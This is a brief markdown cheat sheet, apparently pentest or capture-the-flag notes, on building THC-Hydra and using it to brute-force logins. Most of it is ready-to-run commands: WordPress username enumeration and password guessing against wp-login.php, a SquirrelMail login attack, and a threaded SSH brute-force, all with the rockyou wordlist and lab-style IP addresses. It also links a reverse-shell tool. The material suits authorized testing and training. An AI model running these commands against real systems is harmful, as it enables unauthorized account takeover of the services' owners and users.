# Clone
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
```

# Compile
```bash
./configure
make
make install
```

<https://github.com/cytopia/pwncat>

# WordPress (HTTP Form Post)
```bash
hydra -f -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -V http-form-post '/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'

# check for usernames.
hydra -vV -L fsocity.dic.uniq -p wedontcare 172.16.0.3 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username' -o wpusers.txt
# check for passwords.
hydra -vV -L wpusers-clean.txt -P fsocity.dic.uniq 172.16.0.3 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect' -o wppasswords.txt
```
<https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux/>

# SquirrelMail (HTTP Form Post)
```bash
hydra -l <username> -P log1.txt 10.10.34.188 http-post-form '/squirrelmail/src/redirect.php:login_username=milesdyson&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.'
```

# SSH
```bash
# Bruteforce SSH with a known username and a password list, specifying 4 threads (16 by default).
# -f quits on success.
hydra -f -l <username> -P /usr/share/wordlists/rockyou.txt <IP> -t 4 ssh
```

# References
[thc-hydra](https://github.com/vanhauser-thc/thc-hydra)